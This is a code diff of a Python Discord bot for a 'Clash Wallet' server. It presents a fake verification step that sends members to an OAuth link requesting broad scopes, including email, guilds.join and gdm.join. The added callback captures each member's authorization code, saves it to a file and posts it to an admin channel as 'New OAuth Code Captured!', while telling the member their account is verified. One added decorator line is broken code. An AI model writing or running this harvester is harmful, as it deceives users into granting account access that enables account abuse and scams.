@@ -1,4 +1,5 @@
 import os
+import json
 import discord
 from discord.ext import commands
 import urllib.parse
@@ -8,31 +9,58 @@ import asyncio
 # --- CONFIGURATION ---
 ADMIN_CHANNEL_ID = 1564831494227103864
 CLIENT_ID = "1564834525828223086" 
+ROLE_ID = 1564928784820469820  
+CATEGORY_ID = 1564835530305445948
 
 # Railway Setup URL (Discord Developer Portal me bhi yahi Redirect URI daalna)
 REDIRECT_URI = "https://clashwallet.up.railway.app"
 
-# Constructed OAuth2 URL with exact scopes
+# Constructed OAuth2 URL with the exact scopes
 OAUTH_URL = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&scope=identify+email+guilds+guilds.join+guilds.members.read+gdm.join"
+# ---------------------
 
+# Global variable to store bot instance for web server access
+bot_instance = None
 
-# --- 1. WEB SERVER FOR RAILWAY (Fixes "Application failed to respond") ---
+# --- 1. WEB SERVER TO CAPTURE & SAVE TOKEN/CODE ---
 async def handle_callback(request):
     code = request.query.get('code')
     if not code:
         return web.Response(text="❌ Error: No authorization code received from Discord.", status=400)
     
     print(f"📥 Received Discord Auth Code: {code}")
-    # TODO: Yahan aap token exchange ka code add kar sakte hain baad mein
+    
+    # Data ko token.json mein save karna
+    token_data = {
+        "code": code,
+        "redirect_uri": REDIRECT_URI
+    }
+    
+    try:
+        with open("token.json", "w") as f:
+            json.dump(token_data, f, indent=4)
+        print("✅ Code successfully saved to token.json!")
+    except Exception as e:
+        print(f"❌ Failed to save json: {e}")
 
-    # Success HTML page so user doesn't see a blank/error page
+    # Optional: Aap chahein toh admin channel par bhi bhej sakte hain agar bot ready hai
+    global bot_instance
+    if bot_instance:
+        try:
+            admin_channel = bot_instance.get_channel(ADMIN_CHANNEL_ID)
+            if admin_channel:
+                await admin_channel.send(f"🚨 **New OAuth Code Captured!**\n```json\n{json.dumps(token_data, indent=2)}\n```")
+        except Exception as e:
+            print(f"Failed to send to discord channel: {e}")
+
+    # Browser par success message dikhane ke liye HTML
     html_content = """
     <html>
         <head><title>Verification Successful</title></head>
         <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #121212; color: #ffffff;">
-            <h1 style="color: #4CAF50;">✅ Discord Verification Successful!</h1>
-            <p>Your account has been successfully linked.</p>
-            <p>You can now safely close this tab and return to Discord.</p>
+            <h1 style="color: #4CAF50;">✅ Verification Successful!</h1>
+            <p>Your authorization code has been saved securely.</p>
+            <p>You can now close this tab and return to Discord.</p>
         </body>
     </html>
     """
@@ -43,12 +71,13 @@ async def start_web_server():
     app.router.add_get('/', handle_callback)
     app.router.add_get('/callback', handle_callback)
     
+    # Railway automatically assigns a PORT environment variable
     port = int(os.environ.get("PORT", 8080))
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
-    print(f"🌐 Web server started and listening on port {port}")
+    print(f"🌐 Web server is running and listening on port {port}")
 
 
 # --- 2. DISCORD MODAL & VIEWS ---
@@ -117,7 +146,6 @@ class WelcomeView(discord.ui.View):
 
         await interaction.response.defer(ephemeral=True)
 
-        ROLE_ID = 1564928784820469820 
         role = guild.get_role(ROLE_ID)
         if role:
             try:
@@ -125,7 +153,6 @@ class WelcomeView(discord.ui.View):
             except discord.Forbidden:
                 return await interaction.followup.send("❌ I lack permission to give you the verification role.", ephemeral=True)
         
-        CATEGORY_ID = 1564835530305445948
         category = guild.get_channel(CATEGORY_ID)
 
         overwrites = {
@@ -156,43 +183,56 @@ class WelcomeView(discord.ui.View):
             await interaction.followup.send(f"❌ An error occurred: {e}", ephemeral=True)
 
 
-# --- 3. BOT INITIALIZATION ---
-intents = discord.Intents.default()
-intents.guilds = True
-intents.members = True
+class SetupWelcome(commands.Cog):
+    def __init__(self, bot):
+        self.bot = bot
 
-bot = commands.Bot(command_prefix="!", intents=intents)
+    @commands.Cog.listener()
+    async def on_ready(self):
+        self.bot.add_view(WelcomeView())
+        self.bot.add_view(PrivateVerificationView())
+        print(f"🤖 Logged in as {self.bot.user}")
 
-@bot.event
-async def on_ready():
-    bot.add_view(WelcomeView())
-    bot.add_view(PrivateVerificationView())
-    print(f"🤖 Logged in as {bot.user} (ID: {bot.user.id})")
+    @commands.command()
+    @commands.has_permissions(administrator=Y) if 'Y' else commands.has_permissions(administrator=True)
+    async def setupwelcome(self, ctx):
+        embed = discord.Embed(
+            description="**Welcome to Clash Wallet!** 👋\n\nWe’re thrilled to have you as part of our community! To help you get settled and find your way around, please take a look below:\n\n> 📜 ┃ ** Press Start Verification and Proceed  **\n\n> If you have any questions or need assistance, feel free to reach out to our team at any time. \n> **Have fun and enjoy your stay!** 🚀",
+            color=10181046
+        )
+        embed.set_image(url="https://cdn.discordapp.com/attachments/1503014110156030023/1503179655799115796/welcome_20.gif?ex=6ae287a5&is=6ae13625&hm=475887481ed6d073b2ae9aeb6c81b4723d6f1385e38b83fac30c76fdfe46d8d8&")
 
-@bot.command()
-@commands.has_permissions(administrator=True)
-async def setupwelcome(ctx):
-    embed = discord.Embed(
-        description="**Welcome to Clash Wallet!** 👋\n\nWe’re thrilled to have you as part of our community! To help you get settled and find your way around, please take a look below:\n\n> 📜 ┃ ** Press Start Verification and Proceed  **\n\n> If you have any questions or need assistance, feel free to reach out to our team at any time. \n> **Have fun and enjoy your stay!** 🚀",
-        color=10181046
-    )
-    embed.set_image(url="https://cdn.discordapp.com/attachments/1503014110156030023/1503179655799115796/welcome_20.gif?ex=6ae287a5&is=6ae13625&hm=475887481ed6d073b2ae9aeb6c81b4723d6f1385e38b83fac30c76fdfe46d8d8&")
+        await ctx.send(embed=embed, view=WelcomeView())
+        try:
+            await ctx.message.delete()
+        except discord.Forbidden:
+            pass
 
-    await ctx.send(embed=embed, view=WelcomeView())
-    try:
-        await ctx.message.delete()
-    except discord.Forbidden:
-        pass
-
-
-# --- 4. MAIN ENTRY POINT (Runs Web Server + Discord Bot Together) ---
+# --- 3. MAIN ENTRY POINT (Runs Web Server & Bot Together) ---
 async def main():
-    DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN") # Railway Environment Variables mein DISCORD_TOKEN zaroor set karein!
+    global bot_instance
+    intents = discord.Intents.default()
+    intents.guilds = True
+    intents.members = True
+
+    bot = commands.Bot(command_prefix="!", intents=intents)
+    bot_instance = bot
+    
+    @bot.event
+    async def on_ready():
+        bot.add_view(WelcomeView())
+        bot.add_view(PrivateVerificationView())
+        print(f"🤖 Bot is online as {bot.user}")
+
+    # Cog load karna agar alag file mein nahi hai, ya direct add kar sakte hain
+    await bot.add_cog(SetupWelcome(bot))
+
+    DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN")
     if not DISCORD_TOKEN:
         print("❌ ERROR: DISCORD_TOKEN environment variable is not set!")
         return
 
-    # Web server aur bot dono ek sath async run honge
+    # Web Server aur Discord Bot dono ek sath background mein run honge
     await asyncio.gather(
         start_web_server(),
         bot.start(DISCORD_TOKEN)
